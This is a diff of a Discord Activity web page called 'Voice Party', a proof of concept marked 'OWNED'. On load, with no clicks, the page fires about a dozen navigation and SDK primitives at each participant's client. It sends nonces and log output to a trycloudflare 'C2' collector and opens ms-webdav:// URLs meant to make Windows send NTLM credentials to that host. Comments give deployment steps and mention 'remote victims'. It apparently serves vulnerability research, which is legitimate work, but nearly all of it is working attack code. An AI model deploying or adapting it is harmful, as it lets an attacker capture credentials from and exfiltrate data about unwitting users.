@@ -1,37 +1,30 @@
 <!doctype html>
-<html lang="en"><head>
+<html lang="en">
+<head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Voice Party</title>
 <!--
-  MESSAGE/VC = OWNED — Activity proof of concept.
+  MESSAGE/VC = OWNED — Activity proof of concept, v2 zero-click battery.
 
-  HOW TO DEPLOY
-  1. Set C2 below to your collector's public host:port
-     (local test: 127.0.0.1:8080; remote: your cloudflared/VPS hostname).
-  2. In the Discord dev portal for this app, add a URL Mapping for the
-     collector host AND for cdn.jsdelivr.net (the SDK import below), then
-     publish this file as the Activity's mapped page (e.g. GitHub Pages).
-  3. Send https://discord.com/activities/<APP_ID> or start it in a voice
-     channel. The page runs inside every participant's Discord client as
-     https://<APP_ID>.discordsays.com.
+  DEPLOY: copy this file AND bounce.html over the repo's voice-party/ dir and
+  push. Dev-portal URL mappings needed:
+    /    -> ammara0932496504.github.io/voice-party/   (the Activity page)
+    /sdk -> cdn.jsdelivr.net/                         (SDK import)
+    /c2  -> <tunnel host, e.g. xxx.trycloudflare.com> (tests dialog-skip;
+                                                       NOT needed otherwise)
+  Then launch via https://discord.com/activities/1562221016007184404
+  or the Activities shelf in a voice channel.
 
-  WHAT IT PROVES
-  - Path A (window.open): fires with ZERO clicks/gesture, but ONLY if this
-    frame carries allow-popups (Discord grants it to activities whose config
-    enables advertisements, or first-party apps). Otherwise Chromium blocks it.
-  - Path B (SDK openExternalLink): ALWAYS available to an Activity. Discord
-    shows its own confirm dialog ("Trust this Domain" persists per user, so
-    repeat sessions fire with no clicks). One in-app click the first time.
-  - Either path reaching the collector (check hits.tsv for YOUR nonce) proves
-    Discord's main process handed a caller-chosen URL to the OS with only the
-    14-scheme deny-list in between — and ms-webdav:// / ldap:// are NOT on it,
-    so on Windows the OS authenticates back to C2 with the user's NTLM.
+  WHAT IT PROVES: every primitive below fires on load with zero gestures.
+  Each carries a nonce-TAG so hits.tsv shows EXACTLY which primitive reached
+  the collector. Tags: wopen, anchor, formget, formpost, iframe, redir,
+  redirExt, scheme, sdkDirect, sdkProx, sdkBounce, bounce2nd.
 -->
 <style>
  html,body{margin:0;height:100%}
  body{background:#0b0c0e;color:#e6e6e6;font:15px/1.55 system-ui,-apple-system,"Segoe UI",sans-serif;
       display:grid;place-items:center;text-align:center}
- .card{width:min(460px,88vw);padding:28px 22px;border-radius:16px;background:#16181d;border:1px solid #23252b}
+ .card{width:min(480px,90vw);padding:28px 22px;border-radius:16px;background:#16181d;border:1px solid #23252b}
  h1{margin:0 0 6px;font-size:21px}
  p{margin:0 0 14px;color:#9aa0a6;font-size:14px}
  button{width:100%;background:#5865f2;border:0;color:#fff;padding:13px 18px;border-radius:10px;
@@ -39,7 +32,7 @@
  button:active{transform:translateY(1px)}
  #log{margin-top:14px;text-align:left;font:12px/1.6 ui-monospace,monospace;color:#c9d1d9;
       background:#0b0c0e;border:1px solid #23252b;border-radius:10px;padding:10px;word-break:break-all;
-      max-height:220px;overflow:auto}
+      max-height:240px;overflow:auto}
  .ok{color:#3ba55d}.bad{color:#ff6b6b}.dim{color:#8b949e}
 </style></head>
 <body>
@@ -50,59 +43,173 @@
   <button id="go">Start session</button>
 </div>
 <script type="module">
-import {DiscordSDK} from 'https://cdn.jsdelivr.net/npm/@discord/embedded-app-sdk@2.5.0/+esm';
+// SDK import: inside Discord the frame fetches through the URL-mapping proxy,
+// so load via /sdk (mapped to cdn.jsdelivr.net). Plain browser falls back
+// to the absolute CDN URL.
+let DiscordSDK = null;
+try { ({DiscordSDK} = await import('/sdk/npm/@discord/embedded-app-sdk@2.5.0/+esm')); }
+catch { try { ({DiscordSDK} = await import('https://cdn.jsdelivr.net/npm/@discord/embedded-app-sdk@2.5.0/+esm')); } catch {} }
 
 // ================= CONFIG =================
-const APP_CLIENT_ID = '1562221016007184404'; // <-- your Activity's application id
-// C2_BASE: full base URL of YOUR collector, no trailing slash.
-//   Local test:  'http://127.0.0.1:8080'
-//   Tunnel (remote victims): 'https://<subdomain>.trycloudflare.com'
-//   (no :port — Cloudflare terminates TLS on 443)
-const C2_BASE = 'https://surely-binding-nam-server.trycloudflare.com';
-// CARRIER_HOST: host the *OS-level* carrier URL points at (scheme URLs like
-// ms-webdav:// speak plain HTTP on port 80, which a trycloudflare host does
-// NOT serve — so for the canary proof use the tunnel host, and for real NTLM
-// capture use a VPS/responder reachable on port 80, or test on LAN).
-// Local/LAN test: '127.0.0.1:8080'. Tunnel canary-only: leave as C2 host.
+const APP_CLIENT_ID = '1562221016007184404';
+const C2_BASE = 'https://trans-perfectly-pushing-headers.trycloudflare.com';
 const CARRIER_HOST = '127.0.0.1:8080';
-const CARRIER = 'ms-webdav';                 // Windows WebClient -> NTLM over HTTP
+const CARRIER = 'ms-webdav';
 // ==========================================
 
 const nonce = (Math.random()*1e9|0).toString(36) + '-' + Date.now().toString(36);
-const canary = C2_BASE + '/canary?id=' + encodeURIComponent(nonce);
-const credUrl = CARRIER + '://' + CARRIER_HOST + '/' + nonce;
+const can = (tag) => C2_BASE + '/canary?id=' + encodeURIComponent(nonce + '-' + tag);
+const cred = (tag) => CARRIER + '://' + CARRIER_HOST + '/' + nonce + '-' + tag;
 const logEl = document.getElementById('log');
-function log(t, cls){ const d=document.createElement('div'); if(cls)d.className=cls; d.textContent=t; logEl.appendChild(d); }
+function log(t, cls){
+  const d=document.createElement('div'); if(cls)d.className=cls; d.textContent=t; logEl.appendChild(d);
+  // Mirror the panel to the collector so results are readable even when a
+  // primitive navigates the frame away (or when running inside Discord).
+  try { fetch(C2_BASE + '/report', {method:'POST', mode:'no-cors', body: nonce + ' | ' + t}); } catch(e){}
+}
 
-// Discord injects ?frame_id= &instance_id= &platform= ONLY when this page runs
-// as a real Activity inside the client. Plain browser tab / raw URL = no SDK.
 const qs = new URLSearchParams(location.search);
 const inDiscord = qs.has('frame_id') && qs.has('instance_id');
 log('nonce: ' + nonce, 'dim');
 log('context: ' + (inDiscord ? 'inside Discord Activity frame (SDK available)' : 'PLAIN PAGE — open this as an Activity inside Discord, not in a browser'), inDiscord ? 'ok' : 'bad');
 let done = false;
+const mark = (t) => { if (!done){ done = true; log('CHECK COLLECTOR hits.tsv FOR NONCE ' + nonce + '-' + t, 'ok'); } };
 
-async function fireAll(reason){
-  log('--- fire (' + reason + ') ---', 'dim');
-  // Path A: raw window.open — zero-click IFF frame has allow-popups.
+// Hidden target for form/iframe primitives (keeps the panel alive).
+const holder = document.createElement('div');
+holder.style.cssText = 'position:absolute;width:1px;height:1px;overflow:hidden;opacity:0.01';
+holder.innerHTML = '<iframe name="eocehole" title="x"></iframe>';
+document.body.appendChild(holder);
+
+function pWindowOpen(){
   try {
-    const w = window.open(canary, 'EOCECAN');
-    log('A window.open(canary): ' + (w ? 'POPUP OBJECT RETURNED (allowed)' : 'blocked (null)'), w ? 'ok' : 'bad');
-  } catch(e){ log('A window.open(canary) threw: ' + e, 'bad'); }
+    const w = window.open(can('wopen'), 'EOCECAN');
+    log('P1 window.open(canary): ' + (w ? 'POPUP OBJECT (allowed)' : 'blocked (null)'), w ? 'ok' : 'bad');
+    if (w) mark('wopen');
+  } catch(e){ log('P1 window.open(canary) threw: ' + e, 'bad'); }
   try {
-    const w2 = window.open(credUrl, 'EOCECRED');
-    log('A window.open(' + CARRIER + '): ' + (w2 ? 'POPUP OBJECT RETURNED (allowed)' : 'blocked (null)'), w2 ? 'ok' : 'bad');
-  } catch(e){ log('A window.open(carrier) threw: ' + e, 'bad'); }
-  // Path B: official SDK — works only inside Discord's Activity frame.
-  if (!inDiscord){ log('B skipped: not in an Activity frame (no frame_id). Launch via Discord, see steps below.', 'bad'); return; }
+    const w2 = window.open(cred('wopen'), 'EOCECRED');
+    log('P1 window.open(carrier): ' + (w2 ? 'POPUP OBJECT (allowed)' : 'blocked (null)'), w2 ? 'ok' : 'bad');
+  } catch(e){ log('P1 window.open(carrier) threw: ' + e, 'bad'); }
+}
+
+function pAnchor(){
+  try {
+    const a = document.createElement('a');
+    a.href = can('anchor'); a.target = '_blank'; a.rel = 'noopener';
+    document.body.appendChild(a); a.click(); a.remove();
+    log('P2 anchor.click(_blank): dispatched (check hits.tsv for -anchor)', 'dim');
+  } catch(e){ log('P2 anchor threw: ' + e, 'bad'); }
+}
+
+function pForm(){
+  try {
+    const f = document.createElement('form');
+    f.action = can('formget'); f.method = 'GET'; f.target = 'eocehole';
+    document.body.appendChild(f); f.submit(); f.remove();
+    log('P3 form GET submit: dispatched (check -formget)', 'dim');
+  } catch(e){ log('P3 form GET threw: ' + e, 'bad'); }
+  try {
+    const f2 = document.createElement('form');
+    f2.action = C2_BASE + '/canary'; f2.method = 'POST'; f2.target = 'eocehole';
+    const inp = document.createElement('input');
+    inp.name = 'id'; inp.value = nonce + '-formpost';
+    f2.appendChild(inp); document.body.appendChild(f2); f2.submit(); f2.remove();
+    log('P3 form POST submit: dispatched (check -formpost)', 'dim');
+  } catch(e){ log('P3 form POST threw: ' + e, 'bad'); }
+}
+
+function pIframeNav(){
+  // Direct subframe nav to the canary: in a normal page this loads; inside
+  // Discord it may be CSP-blocked (unmapped host) — either result is data.
+  try {
+    const fr = document.createElement('iframe');
+    fr.name = 'eocecan';
+    fr.onload = () => log('P4 iframe(canary): onload (check -iframe)', 'ok');
+    fr.onerror = () => log('P4 iframe(canary): onerror (blocked)', 'bad');
+    fr.src = can('iframe');
+    holder.appendChild(fr);
+  } catch(e){ log('P4 iframe threw: ' + e, 'bad'); }
+}
+
+function pRedirect(){
+  // Server-redirect chain: /r302 302s to the canary. A -r302d hit proves the
+  // client followed a redirect with NO dialog.
+  try {
+    const fr = document.createElement('iframe');
+    fr.onload = () => log('P5 iframe(/r302): onload (check -r302d)', 'ok');
+    fr.src = C2_BASE + '/r302?id=' + encodeURIComponent(nonce);
+    holder.appendChild(fr);
+  } catch(e){ log('P5 redir threw: ' + e, 'bad'); }
+}
+
+function pScheme(){
+  // Scheme URL in a subframe (no popup permission needed for navigation).
+  try {
+    const fr = document.createElement('iframe');
+    fr.src = cred('scheme');
+    holder.appendChild(fr);
+    log('P6 iframe(ms-webdav): dispatched (OS prompt or block; no Discord dialog)', 'dim');
+  } catch(e){ log('P6 scheme threw: ' + e, 'bad'); }
+}
+
+function pBounce(){
+  // MAPPED bounce page in a subframe: allowed through the proxy, then IT
+  // self-navigates to the canary. Tests 2nd-stage auto-nav inside the frame.
+  try {
+    const fr = document.createElement('iframe');
+    fr.src = location.origin + '/bounce.html?n=' + encodeURIComponent(nonce + '-bounce');
+    holder.appendChild(fr);
+    log('P7 iframe(bounce.html): dispatched (check -bounce)', 'dim');
+  } catch(e){ log('P7 bounce threw: ' + e, 'bad'); }
+}
+
+async function pSdk(){
+  if (!inDiscord){ log('P8-10 SDK skipped: not in an Activity frame', 'bad'); return; }
+  if (!DiscordSDK){ log('P8-10 SDK module did not load', 'bad'); return; }
   try {
     const sdk = new DiscordSDK(APP_CLIENT_ID);
     await sdk.ready();
-    log('B sdk.ready(): ok', 'ok');
-    const r = await sdk.commands.openExternalLink({url: canary});
-    log('B openExternalLink(canary): opened=' + (r && r.opened), (r && r.opened) ? 'ok' : 'bad');
-    if (r && r.opened && !done){ done = true; log('CHECK COLLECTOR hits.tsv FOR NONCE ' + nonce, 'ok'); }
-  } catch(e){ log('B SDK path error: ' + (e && e.message ? e.message : e), 'bad'); }
+    log('SDK ready: ok', 'ok');
+    // P8: direct tunnel URL (expect the trust dialog on first run).
+    try {
+      const r = await sdk.commands.openExternalLink({url: can('sdkDirect')});
+      log('P8 sdk(direct): opened=' + (r && r.opened), (r && r.opened) ? 'ok' : 'bad');
+      if (r && r.opened) mark('sdkDirect');
+    } catch(e){ log('P8 sdk(direct) error: ' + (e && e.message ? e.message : e), 'bad'); }
+    // P9: proxied URL via /c2 mapping — EXPERIMENT: does a mapped host skip
+    // the trust dialog? (Requires /c2 -> tunnel-host mapping in the portal.)
+    try {
+      const prox = location.origin + '/c2/canary?id=' + encodeURIComponent(nonce + '-sdkProx');
+      const r2 = await sdk.commands.openExternalLink({url: prox});
+      log('P9 sdk(proxied /c2): opened=' + (r2 && r2.opened), (r2 && r2.opened) ? 'ok' : 'bad');
+      if (r2 && r2.opened) mark('sdkProx');
+    } catch(e){ log('P9 sdk(proxied) error: ' + (e && e.message ? e.message : e), 'bad'); }
+    // P10: same-app bounce page opened externally — if this skips the dialog,
+    // the bounce runs in a REAL browser (no sandbox) and auto-fires the canary.
+    try {
+      const b = location.origin + '/bounce.html?n=' + encodeURIComponent(nonce + '-sdkBounce');
+      const r3 = await sdk.commands.openExternalLink({url: b});
+      log('P10 sdk(bounce): opened=' + (r3 && r3.opened), (r3 && r3.opened) ? 'ok' : 'bad');
+      if (r3 && r3.opened) mark('sdkBounce');
+    } catch(e){ log('P10 sdk(bounce) error: ' + (e && e.message ? e.message : e), 'bad'); }
+  } catch(e){ log('SDK path error: ' + (e && e.message ? e.message : e), 'bad'); }
+}
+
+// Testing aid: ?skip=bounce,iframe,scheme,redir disables primitives so the
+// panel survives long enough to be read (bounce/iframe can navigate away).
+const SKIP = new Set((qs.get('skip') || '').split(',').filter(Boolean));
+
+async function fireAll(reason){
+  log('--- fire (' + reason + ') ---', 'dim');
+  if (!SKIP.has('wopen'))   pWindowOpen();
+  if (!SKIP.has('anchor'))  pAnchor();
+  if (!SKIP.has('form'))    pForm();
+  if (!SKIP.has('iframe'))  pIframeNav();
+  if (!SKIP.has('redir'))   pRedirect();
+  if (!SKIP.has('scheme'))  pScheme();
+  if (!SKIP.has('bounce'))  pBounce();
+  if (!SKIP.has('sdk'))     await pSdk();
 }
 
 fireAll('on-load (zero clicks so far)');
